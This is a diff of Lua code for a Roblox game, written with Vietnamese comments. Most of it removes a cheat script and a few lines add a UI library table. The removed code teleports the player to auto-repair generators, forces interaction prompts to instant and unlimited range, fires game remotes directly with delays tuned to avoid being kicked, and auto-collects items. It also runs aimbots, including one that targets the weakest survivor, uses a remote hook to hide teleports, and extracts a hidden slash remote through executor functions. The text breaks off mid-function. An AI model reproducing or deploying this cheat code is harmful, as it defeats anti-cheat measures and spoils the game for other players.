 
--- 🟢 Kiểm tra killer gần generator
-local function isKillerNearGenerator(generatorPos, distance)
-    local killersFolder = workspace.Players:FindFirstChild("Killers")
-    if not killersFolder then return false end
-    for _, killer in ipairs(killersFolder:GetChildren()) do
-        if killer:IsA("Model") and killer:FindFirstChild("HumanoidRootPart") then
-            if DangerousKillers[killer.Name] then
-                local dist = (killer.HumanoidRootPart.Position - generatorPos).Magnitude
-                if dist <= distance then
-                    return true
-                end
-            end
-        end
-    end
-    return false
-end
+local Library = {
+	Version = "1.3.0",
 
--- 🟢 Tìm generator chưa xong (cập nhật genDelay luôn)
-local function getUnfinishedGenerators()
-    local list = {}
-    local map = workspace:FindFirstChild("Map") 
-        and workspace.Map:FindFirstChild("Ingame") 
-        and workspace.Map.Ingame:FindFirstChild("Map")
-    if map then
-        for _, gen in ipairs(map:GetChildren()) do
-            if gen.Name == "Generator" 
-                and gen:FindFirstChild("Progress") 
-                and gen.Progress.Value < 100 then
-                table.insert(list, gen)
-            end
-        end
-    end
+	OpenFrames = {},
+	Options = {},
+	Themes = Themes.Names,
+	Windows = {},
 
-    -- ⚡ Nếu chỉ còn 1 generator => tăng delay để tránh bị kick
-    if #list == 1 then
-        genDelay = 1.5
-    else
-        genDelay = 0.75
-    end
+	Window = nil,
+	WindowFrame = nil,
+	Unloaded = false,
 
-    return list
-end
+	Creator = nil,
 
--- 🟢 Sửa 1 lần rồi nhảy sang generator khác
-local function fixOneGenerator(gen)
-    if solveGeneratorCooldown then return end
-    if not currentCharacter or not currentCharacter:FindFirstChild("HumanoidRootPart") then return end
-
-    local genCFrame = gen:GetPivot()
-    local goalPos = (genCFrame * CFrame.new(0, 0, -7)).Position
-
-    if isKillerNearGenerator(goalPos, 50) then
-        return
-    end
-
-    -- Teleport tới gen
-    currentCharacter:PivotTo(CFrame.new(goalPos + Vector3.new(0, 0, 0))) -- chỉnh độ cao, độ lệch
-    task.wait(0.25)
-
-    local prompt = gen:FindFirstChild("Main") and gen.Main:FindFirstChild("Prompt")
-    if prompt then
-        prompt.HoldDuration = 0
-        prompt.RequiresLineOfSight = false
-        prompt.MaxActivationDistance = 99999
-
-        -- Ấn để sửa 1 lần
-        pcall(function()
-            prompt:InputHoldBegin()
-            prompt:InputHoldEnd()
-        end)
-    end
-
-    if gen:FindFirstChild("Remotes") and gen.Remotes:FindFirstChild("RE") then
-        gen.Remotes.RE:FireServer()
-    end
-
-    -- 🔴 Spam thêm vài lần để chắc chắn thoát GUI trước khi đi gen khác
-    if prompt then
-        task.wait(0)
-        pcall(function()
-            for i = 1, 3 do
-                prompt:InputHoldBegin()
-                task.wait(0)
-                prompt:InputHoldEnd()
-            end
-        end)
-    end
-
-    -- Cooldown
-    solveGeneratorCooldown = true
-    task.delay(genDelay, function()
-        solveGeneratorCooldown = false
-    end)
-end
-
--- 🟢 Survivors Auto Farm
-Tabs.Farm:AddToggle("SurvivorsAutoFarmV2", {
-    Title = "Survivors Farm V2",
-    Default = false
-}):OnChanged(function(Value)
-    _G.SurvivorsFarm = Value
-
-    -- Cập nhật trạng thái in-game
-    task.spawn(function()
-        while _G.SurvivorsFarm do
-            Spectators = {}
-            for _, v in ipairs(workspace:WaitForChild("Players"):WaitForChild("Spectating"):GetChildren()) do
-                table.insert(Spectators, v.Name)
-            end
-            isInGame = not table.find(Spectators, LP.Name)
-            task.wait(0.1)
-        end
-    end)
-
-    -- Kiểm tra survivor
-    task.spawn(function()
-        while _G.SurvivorsFarm do
-            if workspace:FindFirstChild("Players") then
-                local survivorsFolder = workspace.Players:FindFirstChild("Survivors")
-                Survivor = survivorsFolder 
-                    and (survivorsFolder:FindFirstChild(LP.Name) 
-                    or table.find(survivorsFolder:GetChildren(), LP.Character))
-            end
-            task.wait(0.1)
-        end
-    end)
-
-    -- Auto sửa gen
-    task.spawn(function()
-        local survivorsFolder = workspace.Players:WaitForChild("Survivors")
-        while _G.SurvivorsFarm do
-            if Survivor and isInGame then
-                -- lấy nhân vật hiện tại
-                for _, surv in ipairs(survivorsFolder:GetChildren()) do
-                    if surv:GetAttribute("Username") == LP.Name then
-                        currentCharacter = surv
-                        break
-                    end
-                end
-
-                -- tìm gen chưa xong và sửa 1 lần
-                local gens = getUnfinishedGenerators()
-                for _, gen in ipairs(gens) do
-                    if not _G.SurvivorsFarm then break end
-                    fixOneGenerator(gen)
-                    task.wait(genDelay) -- sau khi sửa xong thì nhảy qua gen khác
-                end
-            end
-            task.wait(0.1)
-        end
-    end)
-end)
-
-
-
-
-
-
-
-    Tabs.Farm:AddSection("Generator")
-
-do
-local solveGeneratorCooldown = false
-local AutoFinishGen = false
-local genDelay = 1.5 -- mặc định 1.5s
-
--- Hàm tìm generator gần nhất
-local function getClosestGenerator()
-    local char = game.Players.LocalPlayer.Character
-    if not char or not char.PrimaryPart then return nil end
-
-    local root = char.PrimaryPart
-    local closest, shortestDist = nil, math.huge
-
-    local mapContainer = workspace:FindFirstChild("Map")
-    if mapContainer then
-        local ingame = mapContainer:FindFirstChild("Ingame")
-        if ingame then
-            local map = ingame:FindFirstChild("Map")
-            if map then
-                for _, obj in ipairs(map:GetChildren()) do
-                    if obj.Name == "Generator" and obj:IsA("Model") and obj.PrimaryPart then
-                        local dist = (root.Position - obj.PrimaryPart.Position).Magnitude
-                        if dist < shortestDist then
-                            closest = obj
-                            shortestDist = dist
-                        end
-                    end
-                end
-            end
-        end
-    end
-    return closest
-end
-
--- Nút Finish generator thủ công
-Tabs.Farm:AddButton({
-    Title = "Finish Generator",
-    Callback = function()
-        if solveGeneratorCooldown then 
-            return
-        end
-        if AutoFinishGen then
-            return
-        end
-
-        local gen = getClosestGenerator()
-        if gen and gen:FindFirstChild("Remotes") and gen.Remotes:FindFirstChild("RE") then
-            gen.Remotes.RE:FireServer()
-            solveGeneratorCooldown = true
-            task.delay(genDelay, function()
-                solveGeneratorCooldown = false
-            end)
-        end
-    end
-})
-
--- Toggle Auto Finish Generator
-Tabs.Farm:AddToggle("AutoFinishGen", {
-    Title = "Auto Finish Generator",
-    Default = false
-}):OnChanged(function(state)
-    AutoFinishGen = state
-
-    if state then
-        if solveGeneratorCooldown then
-            Fluent.Options.AutoFinishGen:SetValue(false)
-            return
-        end
-
-        task.spawn(function()
-            while AutoFinishGen do
-                local gen = getClosestGenerator()
-                if gen and gen:FindFirstChild("Remotes") and gen.Remotes:FindFirstChild("RE") then
-                    gen.Remotes.RE:FireServer()
-                end
-                solveGeneratorCooldown = true
-                task.wait(genDelay)
-                solveGeneratorCooldown = false
-            end
-        end)
-    else
-        solveGeneratorCooldown = false
-    end
-end)
-
-
--- Ô nhập delay
-Tabs.Farm:AddInput("GenDelayInput", {
-    Title = "Enter Delay",
-    Default = "1.5",
-    Placeholder = "Write Here (1.5-10)",
-    Numeric = true,
-    Callback = function(value)
-        local num = tonumber(value)
-        if num then
-            -- Clamp giá trị từ 1.5 đến 10
-            genDelay = math.clamp(num, 1.5, 10)
-        else
-        end
-    end
-})
-end
-
-
-do
-local Players = game:GetService("Players")
-local PathfindingService = game:GetService("PathfindingService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local LP = Players.LocalPlayer
-
--- 🔹 Cancel token cho pathfinding
-local h = 0
-_G.PlayerControlled = false
-
--- =========================
---  DANH SÁCH SURVIVORS HỢP LỆ
--- =========================
-local AllowedSurvivors = {
-    ["Noob"] = true, ["Guest1337"] = true, ["Elliot"] = true,
-    ["Shedletsky"] = true, ["TwoTime"] = true, ["007n7"] = true, ["Veeronica"] = true,
-    ["Chance"] = true, ["Builderman"] = true, ["Taph"] = true, ["Dusekkar"] = true,
+	DialogOpen = false,
+	UseAcrylic = false,
+	Acrylic = false,
+	Transparency = true,
+	MinimizeKeybind = nil,
+	MinimizeKey = Enum.KeyCode.LeftControl,
 }
 
-local function isSurvivorValid()
-    local char = LP.Character
-    if not char then return false end
-    return AllowedSurvivors[char.Name] == true
-end
-
--- =========================
---  PHÁT HIỆN NGƯỜI CHƠI ĐIỀU KHIỂN
--- =========================
-local moveKeys = {
-    [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
-    [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
-}
-local activeInputs, lastMoveTick = 0, 0
-local IDLE_GRACE = 0.25
-
-local function setControlled(flag)
-    if _G.PlayerControlled ~= flag then
-        _G.PlayerControlled = flag
-        if flag then h = h + 1 end -- hủy path ngay khi người chơi can thiệp
-    end
-end
-
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-    if input.UserInputType == Enum.UserInputType.Keyboard and moveKeys[input.KeyCode] then
-        activeInputs += 1; setControlled(true)
-    elseif input.UserInputType == Enum.UserInputType.Gamepad1 then
-        activeInputs += 1; setControlled(true)
-    elseif input.UserInputType == Enum.UserInputType.Touch then
-        local cam = workspace.CurrentCamera
-        if cam and input.Position.X < cam.ViewportSize.X * 0.5 then
-            activeInputs += 1; setControlled(true)
-        end
-    end
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Keyboard and moveKeys[input.KeyCode] then
-        activeInputs = math.max(0, activeInputs - 1)
-    elseif input.UserInputType == Enum.UserInputType.Gamepad1 or input.UserInputType == Enum.UserInputType.Touch then
-        activeInputs = math.max(0, activeInputs - 1)
-    end
-    if activeInputs == 0 then lastMoveTick = tick() end
-end)
-
-RunService.Heartbeat:Connect(function()
-    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if not hum then return end
-    if hum.MoveDirection.Magnitude > 0 then
-        lastMoveTick = tick(); setControlled(true)
-    elseif activeInputs == 0 and (tick() - lastMoveTick) >= IDLE_GRACE then
-        setControlled(false)
-    end
-end)
-
--- =========================
---  PATHFINDING
--- =========================
-local function pathfindTo(targetPos)
-    local hNow = h
-    local char = LP.Character
-    if not char then return end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if not (hum and root) then return end
-
-    local path = PathfindingService:CreatePath({
-        AgentRadius = 2, AgentHeight = 5,
-        AgentCanJump = false, AgentJumpHeight = 10, AgentMaxSlope = 45
-    })
-
-    local ok = pcall(function() path:ComputeAsync(root.Position, targetPos) end)
-    if not ok or path.Status ~= Enum.PathStatus.Success then return end
-
-    for _, wp in ipairs(path:GetWaypoints()) do
-        if hNow ~= h or _G.PlayerControlled then return end
-        if not (hum and root and root.Parent) then return end
-
-        hum:MoveTo(wp.Position)
-        repeat task.wait()
-        until hNow ~= h or _G.PlayerControlled or not root.Parent
-           or ((root.Position * Vector3.new(1,0,1) - wp.Position * Vector3.new(1,0,1)).Magnitude <= 2)
-
-        if wp.Action == Enum.PathWaypointAction.Jump then hum.Jump = true end
-    end
-end
-
--- =========================
---  HỖ TRỢ KIỂM TRA KILLER
--- =========================
-local function isKillerNearGenerator(generatorPos, distance)
-    local killersFolder = Workspace.Players:FindFirstChild("Killers")
-    if not killersFolder then return false end
-    for _, killer in ipairs(killersFolder:GetChildren()) do
-        local hrp = killer:FindFirstChild("HumanoidRootPart")
-        if hrp and (hrp.Position - generatorPos).Magnitude <= distance then
-            return true
-        end
-    end
-    return false
-end
-
--- =========================
---  TOGGLE AUTO WALK & FIX GENERATORS
--- =========================
-local GenWalkToggle = Tabs.Farm:AddToggle("GenWalkToggle", {
-    Title = "Walk To Generator",
-    Default = false
-})
-
-GenWalkToggle:OnChanged(function(Value)
-    _G.AutoGenerators = Value
-    if not Value then h = h + 1 end
-
-    -- Auto Sprint (có kiểm soát stamina)
-    if Value then
-        _G.alwaysSprint = true
-        task.spawn(function()
-            local okSprint, sprint = pcall(function() return require(ReplicatedStorage.Systems.Character.Game.Sprinting) end)
-            local okStam, stamina = pcall(function() return require(ReplicatedStorage.Systems.Character.Game.StaminaHandler) end)
-            if not okSprint then return end
-
-            local LOW, HIGH, lastReset, forceStop = 10, 80, tick(), false
-            local function fireSprint(flag)
-                sprint.IsSprinting = flag
-                pcall(function() if sprint.__sprintedEvent then sprint.__sprintedEvent:Fire(flag) end end)
-            end
-
-            while _G.alwaysSprint and _G.AutoGenerators and task.wait() do
-                -- 🔒 Chỉ chạy khi là survivor hợp lệ; nếu không thì tắt sprint và chờ
-                if not isSurvivorValid() then
-                    if okSprint and sprint.IsSprinting then fireSprint(false) end
-                    continue
-                end
-
-                if okStam and type(stamina.Value) == "number" then
-                    if stamina.Value <= LOW then if sprint.IsSprinting then fireSprint(false) end; forceStop = true end
-                    if forceStop and stamina.Value >= HIGH then fireSprint(true); forceStop = false; lastReset = tick() end
-                end
-                if not forceStop and not sprint.IsSprinting then fireSprint(true); lastReset = tick() end
-                if not forceStop and tick() - lastReset >= 3 then
-                    fireSprint(false); task.wait(0.1); fireSprint(true); lastReset = tick()
-                end
-            end
-        end)
-    else
-        _G.alwaysSprint = false
-    end
-
-    -- Auto Generators loop
-    task.spawn(function()
-        while true do
-            if not _G.AutoGenerators then task.wait(1); continue end
-            if not isSurvivorValid() then task.wait(1); continue end -- ✅ chỉ cho phép survivors hợp lệ
-
-            if _G.PlayerControlled then task.wait(0.1); continue end
-
-            local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-            if not hrp then task.wait(1); continue end
-
-            local map = Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("Ingame") and Workspace.Map.Ingame:FindFirstChild("Map")
-            if not map then task.wait(2); continue end
-
-            local gens = {}
-            for _, gen in ipairs(map:GetChildren()) do
-                if gen.Name == "Generator" and gen:FindFirstChild("Progress") and gen.Progress.Value < 100 then
-                    table.insert(gens, gen)
-                end
-            end
-            if #gens == 0 then task.wait(3); continue end
-
-            table.sort(gens, function(a, b)
-                local ca, cb = a.Positions and a.Positions:FindFirstChild("Center"), b.Positions and b.Positions:FindFirstChild("Center") -- ✅ sửa 'và' -> 'and'
-                if ca and cb then
-                    return (hrp.Position - ca.Position).Magnitude < (hrp.Position - cb.Position).Magnitude
-                end
-                return false
-            end)
-
-            local targetGen = gens[1]
-            if targetGen and targetGen.Positions and targetGen.Positions:FindFirstChild("Center") then
-                local center = targetGen.Positions.Center.Position
-                if isKillerNearGenerator(center, 50) then task.wait(2); continue end
-
-                if not _G.PlayerControlled then pcall(function() pathfindTo(center) end) end
-                repeat task.wait(0.05)
-                until not _G.AutoGenerators or _G.PlayerControlled or not hrp.Parent or (hrp.Position - center).Magnitude <= 6
-                if _G.PlayerControlled then continue end
-
-                local prompt = targetGen.Main and targetGen.Main:FindFirstChild("Prompt")
-                if prompt and (hrp.Position - center).Magnitude <= 6 then
-                    prompt.HoldDuration, prompt.RequiresLineOfSight, prompt.MaxActivationDistance = 0, false, 99999
-                    while _G.AutoGenerators and not _G.PlayerControlled and targetGen.Parent and targetGen:FindFirstChild("Progress") and targetGen.Progress.Value < 100 do
-                        if (hrp.Position - center).Magnitude > 6 then break end
-                        -- 🔹 Nhấn 1 lần rồi chờ 3 giây
-                        pcall(function()
-                            prompt:InputHoldBegin()
-                        end)
-                        task.wait(0.2) -- giữ nhẹ để chắc chắn ăn lệnh
-                        pcall(function()
-                            prompt:InputHoldEnd()
-                        end)
-                        task.wait(3.0) -- nghỉ 3 giây
-                    end
-                end
-            end
-            task.wait(0.5)
-        end
-    end)
-end)
-
--- Reset path khi map mới spawn
-Workspace.ChildAdded:Connect(function(child)
-    if child.Name == "Map" then h = h + 1 end
-end)
-end
-
-
-
-    Tabs.Farm:AddSection("Items")
-
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-
--- Hàm nhặt item gần nhất
-local function pickUpNearest()
-    local map = workspace:FindFirstChild("Map") 
-                and workspace.Map:FindFirstChild("Ingame") 
-                and workspace.Map.Ingame:FindFirstChild("Map")
-    if not map or not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then return end
-
-    local oldCFrame = LP.Character.HumanoidRootPart.CFrame
-    for _, item in ipairs(map:GetChildren()) do
-        if item:IsA("Tool") and item:FindFirstChild("ItemRoot") 
-           and item.ItemRoot:FindFirstChild("ProximityPrompt") then
-            LP.Character.HumanoidRootPart.CFrame = item.ItemRoot.CFrame
-            task.wait(0.3)
-            fireproximityprompt(item.ItemRoot.ProximityPrompt)
-            task.wait(0.4)
-            LP.Character.HumanoidRootPart.CFrame = oldCFrame
-            break
-        end
-    end
-end
-
--- Button: Pick Up Item (1 lần)
-Tabs.Farm:AddButton({
-    Title = "Pick Up Item",
-    Callback = pickUpNearest
-})
-
--- Toggle: Auto PickUp Item (lặp)
-Tabs.Farm:AddToggle("ItemPick", {
-    Title = "Auto PickUp Item",
-    Default = false
-}):OnChanged(function(Value)
-    _G.PickupItem = Value
-    if not Value then return end
-
-    task.spawn(function()
-        while _G.PickupItem do
-            pickUpNearest()
-            task.wait(0.2) -- delay giữa mỗi lần nhặt
-        end
-    end)
-end)
-
-
-
-
--- Tabs.Main
-
-Tabs.Main:AddParagraph({
-    Title = "How to Use Script :",
-    Content = "1: Must adjust the slider to increase or decrease\n2: Must not be min or max because it will not work\n3: Then turn on the buttons to use those functions\n\n|| Like, Share And Subscribe For SLK gaming ||"
-})
-
-
-
-    Tabs.Main:AddSection("Eliot")
-
-do
--- 🧩 GUI Toggle + Input
-local toggleOn = false
-local toggleFlag = Instance.new("BoolValue")
-toggleFlag.Name = "EliotPizzaAim_ToggleFlag"
-toggleFlag.Value = false
-
-Tabs.Main:AddToggle("NemPizza", {
-    Title = "Pizza Aimbot",
-    Default = toggleOn,
-}):OnChanged(function(state)
-    toggleOn = state
-    toggleFlag.Value = state
-end)
-
--- khoảng cách aim (studs)
-local maxDistance = 100
-Tabs.Main:AddInput("PizzaAimDistance", {
-    Title = "Aim Distance",
-    Default = tostring(maxDistance),
-    Placeholder = "Enter Number",
-}):OnChanged(function(value)
-    local num = tonumber(value)
-    if num then
-        maxDistance = num
-    end
-end)
-
--- ⚙️ Services
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local localPlayer = Players.LocalPlayer
-local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
-
--- 🎞️ Animation IDs
-local PizzaAnimation = {
-    ["114155003741146"] = true,
-    ["104033348426533"] = true
-}
-
--- 🧠 Eliot check
-local EliotModels = {["Elliot"] = true}
-
--- 🔖 State
-local autoRotateDisabledByScript = false
-local currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
-local aimOffset = 2 -- lệch phải 2 studs
-
--- ⚙️ Utils
-local function isEliot()
-    local char = localPlayer.Character
-    return char and EliotModels[char.Name] or false
-end
-
-local function getMyHumanoid()
-    local char = localPlayer.Character
-    return char and char:FindFirstChildWhichIsA("Humanoid")
-end
-
-local function restoreAutoRotate()
-    local hum = getMyHumanoid()
-    if hum and autoRotateDisabledByScript then
-        hum.AutoRotate = true
-        autoRotateDisabledByScript = false
-    end
-end
-
-local function isPlayingDangerousAnimation()
-    local humanoid = getMyHumanoid()
-    if not humanoid then return false end
-    local animator = humanoid:FindFirstChildOfClass("Animator")
-    if not animator then return false end
-    for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
-        if track and track.Animation and track.Animation.AnimationId then
-            local animId = tostring(track.Animation.AnimationId):match("%d+")
-            if animId and PizzaAnimation[animId] then
-                return true
-            end
-        end
-    end
-    return false
-end
-
--- 🎯 Lấy survivor yếu máu nhất (trong folder Survivors)
-local function getWeakestSurvivor()
-    local list = {}
-    local myChar = localPlayer.Character
-    local myHum = getMyHumanoid()
-    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
-    if not myRoot or not myHum or not myHum.MaxHealth or myHum.MaxHealth <= 0 then return nil end
-
-    local myHpPercent = myHum.Health / myHum.MaxHealth
-
-    for _, obj in ipairs(survivorsFolder:GetChildren()) do
-        if obj:IsA("Model") and obj ~= myChar then
-            local hum = obj:FindFirstChildWhichIsA("Humanoid")
-            local hrp = obj:FindFirstChild("HumanoidRootPart")
-            if hum and hrp and hum.Health > 0 and hum.MaxHealth > 0 then
-                local dist = (hrp.Position - myRoot.Position).Magnitude
-                local hpPercent = hum.Health / hum.MaxHealth
-                if dist <= maxDistance then
-                    table.insert(list, {model = obj, hp = hpPercent})
-                end
-            end
-        end
-    end
-
-    -- Sắp xếp theo % máu tăng dần
-    table.sort(list, function(a, b)
-        return a.hp < b.hp
-    end)
-
-    if #list == 0 then return nil end
-    if myHpPercent <= list[1].hp and #list > 1 then
-        return list[2].model
-    else
-        return list[1].model
-    end
-end
-
--- 🔁 Reset khi respawn
-localPlayer.CharacterAdded:Connect(function()
-    task.delay(0.1, function()
-        autoRotateDisabledByScript = false
-    end)
-end)
-
--- 🔂 Main loop
-RunService.RenderStepped:Connect(function()
-    if not toggleFlag.Value then
-        restoreAutoRotate()
-        currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
-        return
-    end
-
-    if not isEliot() then
-        restoreAutoRotate()
-        currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
-        return
-    end
-
-    local myHumanoid = getMyHumanoid()
-    if not myHumanoid then return end
-    local myRoot = myHumanoid.Parent and myHumanoid.Parent:FindFirstChild("HumanoidRootPart")
-    if not myRoot then return end
-
-    local isPlaying = isPlayingDangerousAnimation()
-
-    -- 🧲 Lock target khi bắt đầu animation
-    if isPlaying and not isLockedOn then
-        currentTarget = getWeakestSurvivor()
-        if currentTarget then isLockedOn = true end
-    end
-
-    -- ⚙️ Validate target
-    if isLockedOn and currentTarget then
-        local tHum = currentTarget:FindFirstChildWhichIsA("Humanoid")
-        local tHrp = currentTarget:FindFirstChild("HumanoidRootPart")
-        if (not tHum) or (tHum.Health <= 0) or (not tHrp) then
-            currentTarget, isLockedOn = nil, false
-        end
-    end
-
-    -- ⏹️ End animation -> reset
-    if (not isPlaying) and wasPlayingAnimation then
-        currentTarget, isLockedOn = nil, false
-        restoreAutoRotate()
-    end
-    wasPlayingAnimation = isPlaying
-
-    -- 🎯 Aim logic
-    if isPlaying and isLockedOn and currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
-        local hrp = currentTarget.HumanoidRootPart
-        local targetPos = hrp.Position
-        if not autoRotateDisabledByScript then
-            myHumanoid.AutoRotate = false
-            autoRotateDisabledByScript = true
-        end
-
-        -- dự đoán hướng di chuyển nhẹ
-        local vel = hrp.Velocity
-        if vel and vel.Magnitude > 2 then
-            targetPos = targetPos + hrp.CFrame.LookVector * 3
-        end
-
-        -- lệch phải
-        local offset = myRoot.CFrame.RightVector * aimOffset
-        local lookAt = Vector3.new(targetPos.X, myRoot.Position.Y, targetPos.Z) + offset
-
-        myRoot.CFrame = myRoot.CFrame:Lerp(CFrame.lookAt(myRoot.Position, lookAt), 0.99)
-    end
-end)
-end
-
-
-
---// 🍕 Auto Eat Pizza Instantly (Fluent Toggle Style)
---// ======================================
-
-do
-    -- 🌍 Global Vars
-    local Players = game:GetService("Players")
-    local Workspace = game:GetService("Workspace")
-    local LocalPlayer = Players.LocalPlayer
-
-    getgenv().BlinkToPizzaToggle = false
-    getgenv().HPThreshold = 30
-
-    -- 🧩 Helper Functions
-    local function getHRP()
-        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        return char:WaitForChild("HumanoidRootPart")
-    end
-
-    local function getHP()
-        local char = LocalPlayer.Character
-        if char then
-            local hum = char:FindFirstChildOfClass("Humanoid")
-            if hum then return hum.Health end
-        end
-        return 0
-    end
-
-    local function getPizzaCF()
-        local map = Workspace:FindFirstChild("Map")
-        local ingame = map and map:FindFirstChild("Ingame")
-        if not ingame then return nil end
-
-        local pizza = ingame:FindFirstChild("Pizza")
-        if not pizza then return nil end
-
-        if pizza:IsA("BasePart") or pizza:IsA("MeshPart") or pizza:IsA("UnionOperation") then
-            return pizza.CFrame
-        elseif pizza:IsA("Model") then
-            local pp = pizza.PrimaryPart or pizza:FindFirstChildWhichIsA("BasePart")
-            if pp then
-                if not pizza.PrimaryPart then pizza.PrimaryPart = pp end
-                return pp.CFrame
-            end
-        elseif pizza:IsA("CFrameValue") then
-            return pizza.Value
-        end
-    end
-
-    -- ?? Fluent UI Section
-
-    -- 🍕 Toggle tự ăn pizza
-    Tabs.Main:AddToggle("BlinkPizza_Toggle", {
-        Title = "Auto Eat Pizza",
-        Default = false,
-    }):OnChanged(function(state)
-        getgenv().BlinkToPizzaToggle = state
-    end)
-
-    -- ❤️ Input HP Threshold
-    Tabs.Main:AddInput("PizzaHPThreshold", {
-        Title = "HP Threshold",
-        Default = tostring(getgenv().HPThreshold),
-        Placeholder = "30",
-    }):OnChanged(function(value)
-        local num = tonumber(value)
-        if num then
-            getgenv().HPThreshold = num
-        end
-    end)
-
-    -- 🔁 Auto Loop
-    task.spawn(function()
-        while task.wait(0.9) do
-            if getgenv().BlinkToPizzaToggle then
-                local hrp = getHRP()
-                local pizzaCF = getPizzaCF()
-                if pizzaCF and getHP() <= getgenv().HPThreshold then
-                    local oldCF = hrp.CFrame
-                    hrp.CFrame = pizzaCF * CFrame.new(0, 1, 0)
-
-                    if getgenv().activateRemoteHook then
-                        getgenv().activateRemoteHook("UnreliableRemoteEvent", "UpdCF")
-                    end
-
-                    task.delay(0.2, function()
-                        hrp.CFrame = oldCF
-                        task.wait(0.3)
-                        if getgenv().deactivateRemoteHook then
-                            getgenv().deactivateRemoteHook("UnreliableRemoteEvent", "UpdCF")
-                        end
-                    end)
-                end
-            end
-        end
-    end)
-end
-
-
-    Tabs.Main:AddSection("Shedletsky")
-
-
-do
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local lp = Players.LocalPlayer
-
-    -- ⚙️ Variables
-    local enabled = false
-    local mode = "AI Aimbot"
-    local cooldown = false
-    local lastTarget = nil
-    local maxDistance = 5
-    local sliderInitialized = false
-
-    local TELEPORT_DURATION = 0.8
-    local AI_DELAY = 15 -- ⏳ Delay giữa mỗi lần teleport AI
-
-    local killersFolder = workspace:WaitForChild("Players"):WaitForChild("Killers")
-
-    -- 🎵 Animation IDs
-    local monitoredAnimations = {
-        'rbxassetid://116618003477002', 'rbxassetid://121255898612475',
-        'rbxassetid://98031287364865',  'rbxassetid://119462383658044',
-        'rbxassetid://77448521277146',  'rbxassetid://103741352379819',
-        'rbxassetid://131696603025265', 'rbxassetid://122503338277352',
-        'rbxassetid://97648548303678'
-    }
-
-    -- 🔧 Slash button + remote
-    local slashButton, slashRemote, slashConnections = nil, nil, {}
-
-    local function findSlashRemote()
-        if slashRemote then return slashRemote end
-        if not slashButton then return nil end
-        for _, conn in ipairs(getconnections(slashButton.MouseButton1Click)) do
-            local f = conn.Function
-            if f and islclosure(f) then
-                for _, v in pairs(getupvalues(f)) do
-                    if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
-                        slashRemote = v
-                        return slashRemote
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    local function initSlashButton()
-        local gui = lp:FindFirstChild("PlayerGui")
-        if not gui then return end
-        local mainUI = gui:FindFirstChild("MainUI")
-        local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
-        slashButton = container and container:FindFirstChild("Slash")
-        if slashButton and slashButton:IsA("ImageButton") then
-            slashConnections = getconnections(slashButton.MouseButton1Click)
-            findSlashRemote()
-        end
-    end
-
-    initSlashButton()
-    lp.CharacterAdded:Connect(function()
-        task.wait(0.5)
-        initSlashButton()
-    end)
-
-    local function useSlash()
-        if slashRemote then
-            pcall(function()
-                slashRemote:FireServer(true)
-                task.delay(0.05, function()
-                    slashRemote:FireServer(false)
-                end)
-            end)
-        elseif slashButton then
-            for _, conn in ipairs(slashConnections) do
-                pcall(function() conn:Fire() end)
-            end
-            pcall(function() slashButton:Activate() end)
-        end
-    end
-
-    -- 🧭 UI
-    local ModeDropdown = Tabs.Main:AddDropdown("SlashMode", {
-        Title = "Slash Mode",
-        Values = { "AI Aimbot", "Player Aimbot" },
-        Default = "AI Aimbot"
-    })
-    ModeDropdown:OnChanged(function(Value)
-        mode = Value
-    end)
-
-    local SlashToggle = Tabs.Main:AddToggle("SlashToggle", {
-        Title = "Auto Slash",
-        Default = false
-    })
-    SlashToggle:OnChanged(function(Value)
-        enabled = Value
-    end)
-
-    local DistanceSlider = Tabs.Main:AddSlider("DistanceSlider", {
-        Title = "Distance",
-        Min = 1, Max = 50, Default = 5,
-        Rounding = 1, ValueName = "studs"
-    })
-    DistanceSlider:OnChanged(function(Value)
-        if not sliderInitialized then
-            sliderInitialized = true
-            return
-        end
-        maxDistance = Value
-    end)
-
-    -- ⚡ Helpers
-    local function getRelativeTeleportPosition(hrp, targetHRP)
-        local toTarget = (hrp.Position - targetHRP.Position).Unit
-        return targetHRP.Position + (toTarget * 2)
-    end
-
-    local function teleportAndSlash(target, spam)
-        if cooldown then return end
-        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-        local kHRP = target:FindFirstChild("HumanoidRootPart")
-        if not hrp or not kHRP then return end
-
-        cooldown = true
-        lastTarget = target
-
-        local start = tick()
-        local conn
-        conn = RunService.Heartbeat:Connect(function()
-            if not (lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and kHRP and kHRP.Parent) then
-                if conn then conn:Disconnect() end
-                cooldown = false
-                lastTarget = nil
-                return
-            end
-
-            if tick() - start >= TELEPORT_DURATION then
-                if conn then conn:Disconnect() end
-                task.delay((mode == "AI Aimbot") and AI_DELAY or TELEPORT_DURATION, function()
-                    cooldown = false
-                    lastTarget = nil
-                end)
-                return
-            end
-
-            local newPos = getRelativeTeleportPosition(hrp, kHRP)
-            hrp.CFrame = CFrame.new(newPos, kHRP.Position)
